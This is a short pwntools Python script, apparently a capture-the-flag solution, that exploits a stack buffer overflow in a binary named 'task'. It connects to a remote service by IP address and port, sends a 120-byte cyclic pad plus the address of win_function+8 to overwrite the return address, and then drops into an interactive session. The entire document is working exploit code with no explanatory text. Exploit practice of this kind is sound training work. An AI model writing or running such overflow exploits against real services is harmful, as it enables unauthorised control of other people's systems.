from pwn import *
p = remote("34.155.40.100", 1234)
#p = process("./task")
elf = ELF("./task", checksec = 0)
p.sendlineafter(b"Name: ", cyclic(120) + p64(elf.sym.win_function + 8))
p.interactive()
